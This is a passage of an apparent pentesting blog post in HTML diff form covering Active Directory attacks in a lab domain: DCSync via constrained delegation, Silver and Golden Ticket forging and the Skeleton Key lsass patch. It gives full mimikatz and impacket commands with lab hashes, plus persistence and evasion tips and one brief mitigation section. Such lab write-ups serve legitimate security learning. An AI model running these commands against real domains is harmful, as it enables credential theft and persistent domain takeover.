+<p>Here we added constrained delegation over the DC, and instead of using host service to get command execution, we will use ldap to be able to get the hashes of any account through DCSync, so the steps are the same than before but instead of host we put ldap, also here we have to put the full domain name on msdsspn, on this case we put <code class="language-plaintext highlighter-rouge">/msdsspn:"time/KAIBA-CORP-DC.KAIBA-CORP.local"</code>, after we have the ticket we use mimikatz: <code class="language-plaintext highlighter-rouge">mimikatz.exe "lsadump::dcsync /user:krbtgt"</code>.</p>
+
+<p><img src="/assets/images/active-directory/mimikatz_dcsync.png" alt="" /></p>
+
+<p>If you want you can save the TGS from Rubeus and load it with mimikatz using <code class="language-plaintext highlighter-rouge">kerberos::ptt &lt;ticketfile&gt;</code>, both work.</p>
+
+<h3 id="mitigation-4">Mitigation</h3>
+
+<p>If you need to use any kind of delegation, add any administrative account with high privileges on “Protected Users” group, also set the propertie “Account is sensitive and cannot be delegated”, so if an attacker get access to a machine with constrained delegation set he won’t be able to pwn inmediatly any delegated machine since he will only be able to impersonate low privileged accounts.</p>
+
+<h1 id="silver-ticket">Silver Ticket</h1>
+
+<p>Silver Tickets are pretty similar to what we did on Constrained delegation, but rather than asking for a TGS from the domain controler we will generate it ourselves, to generate a ticket we need only two things, the hash of the machine on which we want to access a service, and the SID of the domain, to get the hash of the machine we would have to use DCSync or using mimikatz “lsadump::lsa /patch” once we have system privileges on the domain controler, so this is a persistence technique, there are multiple ways of gettig the SID of the domain, for example we could user Powerview, <code class="language-plaintext highlighter-rouge">Get-DomainSID</code>, once we have those things we can create our tickets.</p>
+
+<h3 id="impacket-3">Impacket</h3>
+
+<p>To generate a ticket with impacket we use: <code class="language-plaintext highlighter-rouge">ticketer.py -nthash &lt;hash of the machine&gt; -domain-sid &lt;domain SID&gt; -domain &lt;domain name&gt; -spn &lt;service that we want access&gt; &lt;username for the service&gt;</code>, on this case we generate a ticket for cifs service, so we can run psexec: <code class="language-plaintext highlighter-rouge">ticketer.py -nthash b703d9f3f3125637c9777a4919ee6a5f -domain-sid S-1-5-21-4100948528-2762735150-1331983247 -domain KAIBA-CORP.local -spn cifs/FUSION.KAIBA-CORP.local administrator</code>.</p>
+
+<p><img src="/assets/images/active-directory/silver_impacket.png" alt="" /></p>
+
+<p>Yes, we could have asked for cifs service on constrained delegation and use impacket to get a shell with psexec.</p>
+
+<h3 id="mimikatz-2">Mimikatz</h3>
+
+<p>With mimikatz we run the command: <code class="language-plaintext highlighter-rouge">kerberos::golden /domain:&lt;domain name&gt; /sid:&lt;domain sid&gt; /rc4:&lt;hash of the machine&gt; /user:&lt;username for the service&gt; /service:&lt;service that we want access&gt; /target:&lt;machine name&gt; /ptt</code>, on this case we will get two tickes, one for wsman, and another for http, so we can use powershell remoting: <code class="language-plaintext highlighter-rouge">kerberos::golden /domain:KAIBA-CORP.local /sid:S-1-5-21-4100948528-2762735150-1331983247 /rc4:43ac996d0704892ac6e04841df5d95ad /user:administrator /service:wsman /target:KAIBA-CORP-DC.KAIBA-CORP.local /ptt</code> and <code class="language-plaintext highlighter-rouge">kerberos::golden /domain:KAIBA-CORP.local /sid:S-1-5-21-4100948528-2762735150-1331983247 /rc4:43ac996d0704892ac6e04841df5d95ad /user:administrator /service:http /target:KAIBA-CORP-DC.KAIBA-CORP.local /ptt</code>, after that we can get a powershell shell on the DC running: <code class="language-plaintext highlighter-rouge">Enter-PSSession -computername KAIBA-CORP-DC.KAIBA-CORP.local</code>.</p>
+
+<p><img src="/assets/images/active-directory/silver_mimi.png" alt="" /></p>
+
+<p>Notice that we used nthash on impacket and rc4 on mimikatz, there are other hashes values that we can use besides those ones, and using newer algorithm is less likely to be caught. <a href="https://adsecurity.org/?p=2011">Here</a> is a more detailed explanation of what we need and what we can do with TGS.</p>
+
+<h1 id="golden-ticket">Golden Ticket</h1>
+
+<p>If silver tickets was similar to constrained delegation Golden tickets are similar to unconstrained delegation, just that rather than harvesting TGTs we will forge our own TGTs, to do it we need the hash of krbtgt account and the SID of the domain.</p>
+
+<h3 id="impacket-4">Impacket</h3>
+
+<p>Again we will use ticketer, but we will use the hash of krbtgt instead of the machine one, also we will set the user as administrator so the command is: <code class="language-plaintext highlighter-rouge">ticketer.py -nthash &lt;krbtgt hash&gt; -domain-sid &lt;domain SID&gt; -domain &lt;domain name&gt; administrator</code>, so on this case I run: <code class="language-plaintext highlighter-rouge">ticketer.py -nthash d6fcce69ae31172e9b8bd49d887d92ab -domain-sid S-1-5-21-4100948528-2762735150-1331983247 -domain KAIBA-CORP.local administrator</code>, after exporting the ticket to the env variable KRB5CCNAME you’ll be able to access any service inside the domain without using a password.</p>
+
+<p><img src="/assets/images/active-directory/golden_impacket.png" alt="" /></p>
+
+<h3 id="mimikatz-3">Mimikatz</h3>
+
+<p>With mimikatz we run the command: <code class="language-plaintext highlighter-rouge">kerberos::golden /user:administrator /domain:&lt;domain name&gt; /sid:&lt;domain SID&gt; /krbtgt:&lt;krbtgt rc4 hash&gt; /id:500 /startoffset:0 /endin:600 /renewmax:10080 /ptt</code>, not all parameters are mandatory, but I like to run it like that, so on this case I run: <code class="language-plaintext highlighter-rouge">kerberos::golden /user:administrator /domain:KAIBA-CORP.local /sid:S-1-5-21-4100948528-2762735150-1331983247 /krbtgt:d6fcce69ae31172e9b8bd49d887d92ab /id:500 /startoffset:0 /endin:600 /renexmax:10080 /ptt</code>, now we can access to any service inside the domain from this computer.</p>
+
+<p><img src="/assets/images/active-directory/golden_mimi.png" alt="" /></p>
+
+<p>Since we used krbtgt hash to generate the ticket, it won’t matter if the password of the account is changed, we will still be able to access with the ticket, on the otherside if the krbtgt pasword is reseted the ticket won’t work anymore, passwords managed by the domain are automatically changed after around 30 days, so that will be our persistence with this technique.</p>
+
+<h1 id="skeleton-key">Skeleton Key</h1>
+
+<p>Skeleton Key is a technique that will allow us to access any account using a single password, this is done by patching the lsass process, to perform this attack we have to have domain admin rights, and be inside the domain controler, this is done using mimikatz commands: <code class="language-plaintext highlighter-rouge">privilege::debug</code> and <code class="language-plaintext highlighter-rouge">misc::skeleton</code>, this will allow us to access as any user using “mimikatz” password.</p>
+
+<p><img src="/assets/images/active-directory/skeleton.png" alt="" /></p>
+
+<p>Now we can access to any use using “mimikatz” password, also since the DC is the server patched we have to specify kerberos authentication (-k flag).</p>
+
+<p><img src="/assets/images/active-directory/ps_skeleton.png" alt="" /></p>
+
+<p>If we want to set another password we have to download the source code, modify it and compile mimikatz. If lsass is ran as a protected process we can still use this technique running it on kernel mode driver, however this will be a lot more noisy and easy to catch. The password will last as long as the server if up, if it is rebooted we have to patch it again. The normal passwords of every user will still work, this will be a “second password” for every account.</p>
+
+<h1 id="final-remarks">Final Remarks</h1>
+
+<p>Reading this you might have notice that there is <strong>a lot</strong> missing on this blog, as I said this was no meant to be a complete guide, bloodhound is one of the most important tools that I didn’t mentioned that would allow us to find most of the missconfigurations, also “the printer bug” can be used together with unconstrained delegation to harvest hashes, there are some thing that I left somewhat open so the reader research about it by themselves, also not everything can be patched, because what we do is abuse characteristics of kerberos, so the best that can be done is try the best to catch any IoC that any of this techniques can leave.</p>
+
+<h1 id="references">References</h1>
+
+<p><a href="https://tylersguides.com/guides/search-active-directory-ldapsearch/">https://tylersguides.com/guides/search-active-directory-ldapsearch/</a></p>
+
+<p><a href="https://en.hackndo.com/ntlm-relay/">https://en.hackndo.com/ntlm-relay/</a></p>
+
+<p><a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1</a></p>
+
+<p><a href="https://sec-consult.com/blog/detail/creating-active-directory-labs-for-blue-and-red-teams/">https://sec-consult.com/blog/detail/creating-active-directory-labs-for-blue-and-red-teams/</a></p>
+
+<p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></p>
+
+<p><a href="https://www.praetorian.com/blog/how-to-exploit-active-directory-acl-attack-paths-through-ldap-relaying-attacks/">https://www.praetorian.com/blog/how-to-exploit-active-directory-acl-attack-paths-through-ldap-relaying-attacks/</a></p>
+
+<p><a href="https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/">https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/</a></p>
+
+<p><a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/</a></p>
+
+<p><a href="https://adsecurity.org/?page_id=183">ADsecurity SPNs list</a></p>
+
+<p><a href="https://adsecurity.org/?p=2011">ADsecurity silver ticket guide</a></p>
+
+<p><a href="https://book.hacktricks.xyz/windows/active-directory-methodology">https://book.hacktricks.xyz/windows/active-directory-methodology</a></p>
+
+<p><a href="https://www.udemy.com/course/practical-ethical-hacking/">The Cyber Mentor’s ethical hacking course</a></p>
+
+<p><a href="https://www.pentesteracademy.com/course?id=47">Pentester Academy Attacking and Defending Active Directory course</a></p>
+
+<p><a href="https://www.youtube.com/playlist?list=PLlb2ZjHtNkpg2Mc3mbkdYAhEoqnMGdl2Z">S4vitar’ Active Directory videos (spanish)</a></p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#active-directory"> Active Directory</a> &nbsp;
+  
+  <a href="/tags.html#as-rep-roasting"> AS-REP Roasting</a> &nbsp;
+  
+  <a href="/tags.html#kerberoasting"> Kerberoasting</a> &nbsp;
+  
+  <a href="/tags.html#dcsync"> DCSync</a> &nbsp;
+  
+  <a href="/tags.html#mimikatz"> mimikatz</a> &nbsp;
+  
+  <a href="/tags.html#rubeus"> Rubeus</a> &nbsp;
+  
+  <a href="/tags.html#golden-ticket"> Golden Ticket</a> &nbsp;
+  
+  <a href="/tags.html#silver-ticket"> Silver Ticket</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
